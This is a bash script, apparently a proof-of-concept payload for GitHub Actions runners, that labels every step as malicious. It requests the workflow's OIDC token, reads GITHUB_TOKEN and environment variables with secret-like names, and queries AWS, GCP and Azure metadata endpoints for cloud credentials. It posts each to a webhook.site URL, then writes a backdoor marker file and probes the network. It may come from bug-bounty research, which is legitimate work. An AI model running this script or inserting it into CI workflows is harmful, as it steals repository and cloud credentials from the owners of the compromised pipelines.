#!/bin/bash
echo "[MALICIOUS] Payload executing on runner: $(hostname)"
echo "[MALICIOUS] Current directory: $(pwd)"
echo "[MALICIOUS] User: $(whoami)"
echo "[MALICIOUS] Date: $(date)"
echo ""

# ============================================================
# 1. EXFILTRATE OIDC TOKEN (The $10k finding)
# ============================================================
echo "[MALICIOUS] Step 1: Attempting OIDC token exfiltration..."

if [ ! -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
    echo "[MALICIOUS] OIDC request token found"
    
    # Get OIDC token with audience
    OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
    
    if [ ! -z "$OIDC_TOKEN" ]; then
        echo "[MALICIOUS] OIDC token exfiltrated successfully"
        # Send to webhook.site
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
             -d "oidc_token=$OIDC_TOKEN" \
             -H "Content-Type: application/x-www-form-urlencoded"
        
        # Also send to alternative endpoints (in case one is blocked)
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2/oidc" \
             -d "token=$OIDC_TOKEN"
    else
        echo "[MALICIOUS] Failed to get OIDC token"
    fi
else
    echo "[MALICIOUS] No OIDC request token available"
fi

# ============================================================
# 2. EXFILTRATE GITHUB_TOKEN (if available)
# ============================================================
echo ""
echo "[MALICIOUS] Step 2: Attempting GITHUB_TOKEN exfiltration..."

if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "[MALICIOUS] GITHUB_TOKEN found: ${GITHUB_TOKEN:0:20}..."
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
         -d "github_token=$GITHUB_TOKEN"
else
    echo "[MALICIOUS] GITHUB_TOKEN is empty or not accessible"
fi

# ============================================================
# 3. EXFILTRATE ALL ENVIRONMENT VARIABLES
# ============================================================
echo ""
echo "[MALICIOUS] Step 3: Exfiltrating environment variables..."

env | while read line; do
    # Only send variables that might contain secrets
    if echo "$line" | grep -qi "TOKEN\|SECRET\|KEY\|PASS\|PAT"; then
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
             -d "env=$line" || true
    fi
done

# ============================================================
# 4. AWS METADATA (if runner is on AWS)
# ============================================================
echo ""
echo "[MALICIOUS] Step 4: Checking AWS metadata..."

# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
if [ ! -z "$TOKEN" ]; then
    echo "[MALICIOUS] AWS metadata accessible"
    # Get IAM role credentials
    ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    if [ ! -z "$ROLE" ]; then
        CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "aws_creds=$CREDS"
    fi
fi

# ============================================================
# 5. GCP METADATA (if runner is on GCP)
# ============================================================
echo ""
echo "[MALICIOUS] Step 5: Checking GCP metadata..."

GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
if [ ! -z "$GCP_TOKEN" ]; then
    echo "[MALICIOUS] GCP metadata accessible"
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "gcp_token=$GCP_TOKEN"
fi

# ============================================================
# 6. AZURE METADATA (if runner is on Azure)
# ============================================================
echo ""
echo "[MALICIOUS] Step 6: Checking Azure metadata..."

AZURE_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null)
if [ ! -z "$AZURE_TOKEN" ]; then
    echo "[MALICIOUS] Azure metadata accessible"
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "azure_token=$AZURE_TOKEN"
fi

# ============================================================
# 7. EXFILTRATE WORKFLOW CONTEXT
# ============================================================
echo ""
echo "[MALICIOUS] Step 7: Exfiltrating workflow context..."

# GITHUB_CONTEXT - contains PR info, repository, etc.
if [ ! -z "$GITHUB_EVENT_PATH" ]; then
    EVENT_DATA=$(cat $GITHUB_EVENT_PATH 2>/dev/null | head -c 5000)
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" -d "github_event=$EVENT_DATA"
fi

# ============================================================
# 8. PERSISTENCE - Attempt to add backdoor
# ============================================================
echo ""
echo "[MALICIOUS] Step 8: Attempting persistence..."

# Check if we can write to the runner's filesystem
echo "runner_backdoor_installed" > /tmp/backdoor.txt 2>/dev/null
if [ -f /tmp/backdoor.txt ]; then
    echo "[MALICIOUS] Runner filesystem is writable"
    # In a real attack, could install malware or crypto miner
fi

# ============================================================
# 9. NETWORK RECONNAISSANCE
# ============================================================
echo ""
echo "[MALICIOUS] Step 9: Network reconnaissance..."

# Check what internal networks the runner can reach
curl -s -o /dev/null -w "GitHub API: %{http_code}\n" "https://api.github.com" 2>/dev/null
curl -s -o /dev/null -w "Internal metadata: %{http_code}\n" "http://169.254.169.254" 2>/dev/null

# ============================================================
# 10. SUMMARY
# ============================================================
echo ""
echo "[MALICIOUS] ========== EXFILTRATION COMPLETE =========="
echo "[MALICIOUS] OIDC token sent: $([ ! -z "$OIDC_TOKEN" ] && echo "YES" || echo "NO")"
echo "[MALICIOUS] GitHub token sent: $([ ! -z "$GITHUB_TOKEN" ] && echo "YES" || echo "NO")"
echo "[MALICIOUS] Cloud metadata accessible: $([ ! -z "$TOKEN" ] || [ ! -z "$GCP_TOKEN" ] || [ ! -z "$AZURE_TOKEN" ] && echo "YES" || echo "NO")"
echo "[MALICIOUS] ==========================================="
